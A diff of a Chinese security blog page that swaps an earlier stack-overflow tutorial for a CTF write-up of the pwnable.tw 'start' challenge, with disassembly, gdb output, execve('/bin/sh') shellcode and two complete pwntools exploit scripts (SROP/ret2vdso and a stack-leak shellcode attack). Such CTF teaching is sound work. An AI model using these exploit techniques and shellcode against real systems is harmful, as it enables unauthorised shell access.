@@ -4,38 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>linux x86 栈溢出 | Reshahar的博客</title>
+    <title>pwnable.rw start分析与折腾 | Reshahar的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Reshahar">
     
 
     
-    <meta name="description" content="linux x86 栈溢出">
-<meta name="keywords" content="漏洞,溢出">
+    <meta name="description" content="pwnable.tw 上的第一道题，实际挺简单，但是解决它也走了不少弯路，希望他人可以借鉴">
+<meta name="keywords" content="pwn,stack-overflow">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux x86 栈溢出">
-<meta property="og:url" content="http://Reshahar.github.io/2017/04/13/Linux x86 栈溢出/index.html">
+<meta property="og:title" content="pwnable.rw start分析与折腾">
+<meta property="og:url" content="http://Reshahar.github.io/2017/05/18/pwnable-rw-start分析与折腾/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
-<meta property="og:description" content="linux x86 栈溢出">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211316568">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211328502">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211420894">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211430209">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211442943">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211455660">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211628084">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211639896">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202211711305">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202212147591">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202212136870">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202212129651">
-<meta property="og:image" content="http://img.blog.csdn.net/20161202212119604">
-<meta property="og:updated_time" content="2017-04-13T14:08:13.000Z">
+<meta property="og:description" content="pwnable.tw 上的第一道题，实际挺简单，但是解决它也走了不少弯路，希望他人可以借鉴">
+<meta property="og:updated_time" content="2017-05-19T06:47:52.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux x86 栈溢出">
-<meta name="twitter:description" content="linux x86 栈溢出">
-<meta name="twitter:image" content="http://img.blog.csdn.net/20161202211316568">
+<meta name="twitter:title" content="pwnable.rw start分析与折腾">
+<meta name="twitter:description" content="pwnable.tw 上的第一道题，实际挺简单，但是解决它也走了不少弯路，希望他人可以借鉴">
 
     
     <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
@@ -96,14 +82,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/04/13/Linux x86 栈溢出/" title="linux x86 栈溢出" itemprop="url">linux x86 栈溢出</a>
+      <a href="/2017/05/18/pwnable-rw-start分析与折腾/" title="pwnable.rw start分析与折腾" itemprop="url">pwnable.rw start分析与折腾</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
 		
   <p class="article-time">
-    <time datetime="2017-04-13T14:01:24.000Z" itemprop="datePublished"> 发表于 2017-04-13</time>
+    <time datetime="2017-05-18T15:03:53.000Z" itemprop="datePublished"> 发表于 2017-05-18</time>
       
      &nbsp
      <span id="busuanzi_container_page_pv" style="display:none">
@@ -117,18 +103,149 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-漏洞分析与调试"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析与调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-总结"><span class="toc-number">3.</span> <span class="toc-text">0x03 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
 		
 		</div>
 		
-		<p>linux x86 栈溢出</p>
+		<p>pwnable.tw 上的第一道题，实际挺简单，但是解决它也走了不少弯路，希望他人可以借鉴</p>
 <hr>
 <a id="more"></a>
-<p>环境：<br>1.系统kali linux x64<br>2.开发环境c语言<br>工具：<br>1.Gcc<br>2.Python<br>3.Pwntools<br>4.gdb<br>无防护下的栈溢出<br>1.漏洞程序源代码<br>//Flow.c 源代码<br> <img src="http://img.blog.csdn.net/20161202211316568" alt=""><br>2.编译并关闭dep和栈保护<br>gcc -fno-stack-protector -z execsatck -m32 -o stack1 Flow.c<br> <img src="http://img.blog.csdn.net/20161202211328502" alt=""><br>3.关闭ASLR<br> 运行./close_aslr.sh<br>4.先生成一个字符串（使用pattern.py)<br> <img src="http://img.blog.csdn.net/20161202211420894" alt=""><br>5.运行stack1，输入刚才生成的字符串，栈崩溃了<br>     <img src="http://img.blog.csdn.net/20161202211430209" alt=""><br>6.gdb调试<br><img src="http://img.blog.csdn.net/20161202211442943" alt="">   </p>
-<ol>
-<li>计算偏移位置<br><img src="http://img.blog.csdn.net/20161202211455660" alt=""><br>8.重新生成长度为140的字符串再加上四个‘B’再次使用gdb调试可以看到崩溃的地址是0x42424242这正是“BBBB”的ASCII值<br><img src="http://img.blog.csdn.net/20161202211628084" alt=""><br>9.查看缓冲区开始的地址<br>x/20x $esp-144 或者 x/20s $esp-144 可以得到缓冲区的开始位置<br><img src="http://img.blog.csdn.net/20161202211639896" alt=""><br>10.实际上这些地址都是gdb的调试地址，实际程序运行的地址并不是这些，实际的地址可以通过调试core获取，linux下默认是关闭的，可以通过ulimit -c查看，返回0即为关闭可以通过ulimit -c unlimited 设置成无限大小(仅限本终端)，（永久生效在/etc/profile中写入 source 立即失效）<br>在设置一下core生成的位置echo ‘/core/core<em>%e</em>%p’&gt; /proc/sys/kernel/core_pattern<br>(路径必须存在)<br>11.再次运行stack1，输入140<em>‘A’+4</em>‘B’可以看到生成了core dump<br><img src="http://img.blog.csdn.net/20161202211711305" alt=""><br>12.运行gdb 调试附加stack1和生成的core文件，可以看到断在0x42424242也就是BBBB<br><img src="http://img.blog.csdn.net/20161202212147591" alt=""><br>13.查看一下缓冲区的开始地址为0xffffccd0（不同机子可能不一样）<br><img src="http://img.blog.csdn.net/20161202212136870" alt=""><br>14.找一个shellcode<br><img src="http://img.blog.csdn.net/20161202212129651" alt=""><br>15.运行一个看一下效果，拿下shell<br><img src="http://img.blog.csdn.net/20161202212119604" alt=""></li>
-</ol>
-<p>总结：<br>    这是在没有防护下的栈溢出，在防护下怎绕过，将在下次带给大家！！！</p>
+<h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p>做这个题也花了不少时间，学习了很多最后没用的资料，虽然这些知识没有用到，但是还是收获非常大的。<br>题目相关文件：<a href="https://github.com/Reshahar/BlogFile/tree/master/pwnable.tw-start" target="_blank" rel="external">https://github.com/Reshahar/BlogFile/tree/master/pwnable.tw-start</a></p>
+<h3 id="0x01-漏洞分析与调试"><a href="#0x01-漏洞分析与调试" class="headerlink" title="0x01 漏洞分析与调试"></a>0x01 漏洞分析与调试</h3><p>首先还是使用IDA+F5查看代码，但是结果不是很好，因为源代码就是用汇编写的，所以还是看汇编源代码 </p>
+<pre><code>.text:08048060 _start          proc near
+.text:08048060                 push    esp
+.text:08048061                 push    offset _exit
+.text:08048066                 xor     eax, eax
+.text:08048068                 xor     ebx, ebx
+.text:0804806A                 xor     ecx, ecx
+.text:0804806C                 xor     edx, edx
+.text:0804806E                 push    3A465443h
+.text:08048073                 push    20656874h
+.text:08048078                 push    20747261h
+.text:0804807D                 push    74732073h
+.text:08048082                 push    2774654Ch
+.text:08048087                 mov     ecx, esp        ; addr
+.text:08048089                 mov     dl, 14h         ; len
+.text:0804808B                 mov     bl, 1           ; fd
+.text:0804808D                 mov     al, 4
+.text:0804808F                 int     80h             ; LINUX - sys_write
+.text:08048091                 xor     ebx, ebx
+.text:08048093                 mov     dl, 3Ch
+.text:08048095                 mov     al, 3
+.text:08048097                 int     80h             ; LINUX -//这里没有识别出来是 sys_read 
+.text:08048099                 add     esp, 14h
+.text:0804809C                 retn
+</code></pre><p>代码很简单，逻辑很清晰，就是一个栈溢出，然后就是查看安全机制了，但是这里出现了一个坑…（没想到工具结果出错了，所以不要太依赖工具）</p>
+<pre><code>gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre><p>一看上面的结果开启了NX,首先想到的就是ROP，但是程序太小没有可以用的gadget，所以想到两个方法ret2vdso和SROP，之前没有学习过ret2vdso，就去找了不少资料，资料（英文的）我会放在最后给大家参考，这里不说这个，最后写出来的exp也没有成功，这就开始折腾了</p>
+<p>上面的方法没有成功，所以就再第一种方法上加上了SROP，写出一个exp，这个exp在不开启ASLR是可以getshell的，脚本如下</p>
+<pre><code>#filename:exp_frame_no_aslr.py
+#author:reshahar
+from pwn import *
+
+p = process(&apos;./start&apos;)
+
+#p = remote(&apos;chall.pwnable.tw&apos;,10000)
+
+#p = remote(&apos;127.0.0.1&apos;,7777)
+
+#0xf7ffd000 0xf7ffe000
+
+vdso = 0xf7ffd000
+gad0 = vdso + 0x00000c01    #0x00000c01 : pop edx ; pop ecx ; ret
+gad1 = vdso + 0x00000bd1    #0x00000bd1 : mov eax, 0x77 ; int 0x80
+
+reread = 0x08048095 
+
+context.clear()
+
+frame = SigreturnFrame(kernel=&apos;amd64&apos;)
+frame.eax = 11
+frame.ebx = 0xffffd560
+frame.esp = 0xdeadbeef
+frame.eip = 0x0804808f
+
+payload1 = &apos;A&apos;*20+p32(gad0)+p32(0xff)+p32(0xffffd50c)+p32(reread)+&apos;B&apos;*24  #buffer is little 
+payload2 = p32(gad1)+str(frame)+&apos;/bin/sh\x00&apos;
+
+p.send(payload1+payload2)
+p.interactive()
+</code></pre><p>而pwnable.tw上开启ASLR很明显会失败，因为上面的很多地址都是硬编码</p>
+<p>在之前dump vdso的时候，我就发现栈是可执行的，但是相信了工具，因为是哪里出错了</p>
+<pre><code>gdb-peda$ vmmap 
+Start      End        Perm    Name
+0x08048000 0x08049000 r-xp    /root/D/stack overflow/pwnable.tw-start/start
+0xf7ffb000 0xf7ffd000 r--p    [vvar]
+0xf7ffd000 0xf7ffe000 r-xp    [vdso]
+0xfffdd000 0xffffe000 rwxp    [stack]
+</code></pre><p>但是之前的方法行不通，又想起这个发现，还是将shellcode放到栈上试试,实现这个还是需要，shellcode和栈地址，shellcode好解决，而栈地址呢？</p>
+<p>重新看一下汇编代码，程序的开始会把esp寄存器压栈，然后把_exit函数的地址压栈，通过调试可以发现程序最后是返回到 _exit函数去执行，所以当程序执行ret指令的时候，esp的值的地址存储的正是esp的值，然后把程序劫持到08048087(mov ecx,esp)就可以使用write将这个值打印出来，栈地址就可以获取到了，再使用gdb确定一下shellcod<br>e的地址和esp的地址的偏移就行可以了，下面看一下具体操作</p>
+<p>gdb附加下断点然后单步执行直到程序读入输入的数据,esp的值就是缓冲区的起始位置</p>
+<pre><code>gdb-peda$ b*0x08048087
+Breakpoint 1 at 0x8048087
+...
+gdb-peda$ x/20x $esp
+0xffffd4ec:    0x41414141    0x41414141    0x41414141    0x41414141
+0xffffd4fc:    0x41414141    0xffffd504    0xc931d231    0x2f2f6851
+0xffffd50c:    0x2f686873    0x896e6962    0xcd0bb0e3    0xffffd680
+0xffffd51c:    0xffffd726    0xffffd733    0xffffd746    0xffffd757
+0xffffd52c:    0xffffd762    0xffffd772    0xffffd7a9    0xffffd7f7
+gdb-peda$ x/20x $esp+24        //shellcode起始位置0xffffd504
+0xffffd504:    0xc931d231    0x2f2f6851    0x2f686873    0x896e6962
+0xffffd514:    0xcd0bb0e3    0xffffd680    0xffffd726    0xffffd733
+0xffffd524:    0xffffd746    0xffffd757    0xffffd762    0xffffd772
+0xffffd534:    0xffffd7a9    0xffffd7f7    0xffffd7ff    0xffffd80a
+0xffffd544:    0xffffd81c    0xffffd847    0xffffd855    0xffffd871
+
+栈地址0xffffd4f0
+0xffffd504-0xffffd4f0 = 20  //偏移
+</code></pre><p>完整exp如下：</p>
+<pre><code>#filename:exp.py
+#author:reshahar
+
+from pwn import *
+#p = process(&apos;./start&apos;)
+p = remote(&apos;chall.pwnable.tw&apos;,10000)
+
+#execve(&apos;/bin/sh&apos;)
+# xor edx,edx
+# xor ecx,ecx
+# push ecx
+# push 0x68732f2f ;; hs//
+# push 0x6e69622f ;; nib/
+# mov ebx,esp
+# mov al,11
+# int 0x80
+
+sh=&quot;\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;
+
+reread = 0x08048087 # mov ecx,esp
+
+payload1 = &apos;A&apos;*20+p32(reread)
+
+#raw_input()
+
+p.send(payload1)
+
+p.recvuntil(&quot;Let&apos;s start the CTF:&quot;)
+
+stack_esp = u32(p.recv(4))
+print &apos;stack addr&apos;+hex(stack_esp)
+
+off_of_sh = 20  #stack_esp offset sh
+
+payload2 = &apos;A&apos;*20+p32(stack_esp+off_of_sh)+sh
+
+p.send(payload2)
+
+p.interactive()
+</code></pre><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>简单的栈溢出，其中尝试各种技术花费了不少时间，也就是各种折腾，但是还是学习到了不少的知识</p>
+<h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p>[1]:<a href="http://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="external">http://blog.csdn.net/xiaominthere/article/details/17287965</a> Linux系统调用 int 80h int 0x80<br>[2]:<a href="http://v0ids3curity.blogspot.com/2014/12/return-to-vdso-using-elf-auxiliary.html" target="_blank" rel="external">http://v0ids3curity.blogspot.com/2014/12/return-to-vdso-using-elf-auxiliary.html</a> Return to VDSO using ELF Auxiliary Vectors<br>[3]:<a href="http://www.2cto.com/article/201512/452080.html" target="_blank" rel="external">http://www.2cto.com/article/201512/452080.html</a> Sigreturn Oriented Programming (SROP) Attack攻击原理</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -136,13 +253,13 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/漏洞基础/">漏洞基础</a>
+  <a class="article-category-link" href="/categories/ctf-pwn/">ctf-pwn</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/漏洞/">漏洞</a><a href="/tags/溢出/">溢出</a>
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/stack-overflow/">stack-overflow</a>
   </div>
 
 </div>
@@ -151,7 +268,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://Reshahar.github.io/2017/04/13/Linux x86 栈溢出/" data-title="linux x86 栈溢出 | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://Reshahar.github.io/2017/05/18/pwnable-rw-start分析与折腾/" data-title="pwnable.rw start分析与折腾 | Reshahar的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -165,21 +282,13 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/04/13/一个简单的逆向/" title="一个简单的逆向">
+ <a href="/2017/05/16/2015-casw-precision-100解析/" title="2015-casw-precision-100解析">
   <strong>上一篇：</strong><br/>
   <span>
-  一个简单的逆向</span>
+  2015-casw-precision-100解析</span>
 </a>
 </div>
 
-
-<div class="next">
-<a href="/2017/04/17/python-django-简单总结/"  title="python django 简单总结">
- <strong>下一篇：</strong><br/> 
- <span>python django 简单总结
-</span>
-</a>
-</div>
 
 </nav>
 
@@ -191,7 +300,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-漏洞分析与调试"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析与调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-总结"><span class="toc-number">3.</span> <span class="toc-text">0x03 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
  
   </div>
 
